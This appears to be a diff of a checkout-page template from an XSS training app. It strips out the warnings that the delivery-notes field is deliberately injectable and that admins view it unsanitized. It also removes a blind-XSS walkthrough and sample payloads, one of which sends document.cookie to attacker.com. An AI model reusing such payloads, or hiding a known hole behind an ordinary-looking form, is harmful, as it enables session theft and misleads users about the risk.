@@ -103,13 +103,10 @@
                                         </div>
                                     </div>
 
-                                    <!-- Delivery Notes (XSS Injection Point) -->
+                                    <!-- Delivery Notes -->
                                     <div class="form-group mb-4">
                                         <label for="deliveryNotes" class="form-label">
                                             <i class="fas fa-sticky-note"></i> Delivery Notes
-                                            <span class="badge badge-danger" style="background-color: var(--danger-color); color: white; padding: 0.25rem 0.5rem; border-radius: 4px; font-size: 0.75rem; margin-left: 0.5rem;">
-                                                XSS INJECTION POINT
-                                            </span>
                                         </label>
                                         <textarea 
                                             id="deliveryNotes" 
@@ -119,26 +116,11 @@
                                             placeholder="Enter any special delivery instructions"
                                         ></textarea>
                                         <div class="form-text">
-                                            <strong>Security Training:</strong> This field is vulnerable to XSS. Try injecting payloads like:
-                                            <code><!-- <script>alert('XSS')</script> --></code>
-                                        </div>
-                                        <div class="security-warning mt-2">
-                                            <i class="fas fa-exclamation-triangle"></i>
-                                            <strong>Warning:</strong> The admin order details page renders these notes without sanitization.
-                                            Any script you enter here will execute when an admin views your order.
+                                            Provide any delivery preferences or instructions for the courier.
                                         </div>
                                     </div>
 
-                                    <!-- Security Notice -->
-                                    <div class="card mb-4" style="border-color: var(--warning-color);">
-                                        <div class="card-body">
-                                            <h5 class="card-title">
-                                                <i class="fas fa-shield-alt"></i> Security Training Notice
-                                            </h5>
-                                            <p>This is a <strong>security training environment</strong>. The delivery notes field contains a deliberate XSS vulnerability for educational purposes.</p>
-                                            <p><strong>Do not enter real personal information.</strong> Use test data only.</p>
-                                        </div>
-                                    </div>
+                                    <!-- Security training notice removed for presentation-ready demo -->
 
                                     <!-- Submit Button -->
                                     <div class="d-grid">
@@ -150,32 +132,7 @@
                             </div>
                         </div>
 
-                        <!-- XSS Training Information -->
-                        <div class="card mt-4">
-                            <div class="card-header">
-                                <h3 class="card-title">
-                                    <i class="fas fa-graduation-cap"></i> XSS Training Instructions
-                                </h3>
-                            </div>
-                            <div class="card-body">
-                                <h5>How to practice Blind XSS:</h5>
-                                <ol>
-                                    <li>Enter a shipping address (any test address)</li>
-                                    <li>Inject an XSS payload in the Delivery Notes field</li>
-                                    <li>Click "Place Order" to submit</li>
-                                    <li>The admin bot will automatically view your order within 60 seconds</li>
-                                    <li>Your payload will execute in the admin context</li>
-                                </ol>
-
-                                <h5 class="mt-3">Sample Payloads:</h5>
-                                <div class="code-samples">
-                                    <pre><code><!-- <script>alert('XSS')</script> --></code></pre>
-                                    <!-- <pre><code><script>fetch('http://attacker.com/?cookie='+document.cookie)</script></code></pre>
-                                    <pre><code><img src=x onerror="alert('XSS')"></code></pre>
-                                    <pre><code><svg onload="alert('XSS')"></svg></code></pre> -->
-                                </div>
-                            </div>
-                        </div>
+                        <!-- Demo information removed from checkout page -->
                     </div>
                 </div>
             <% } %>
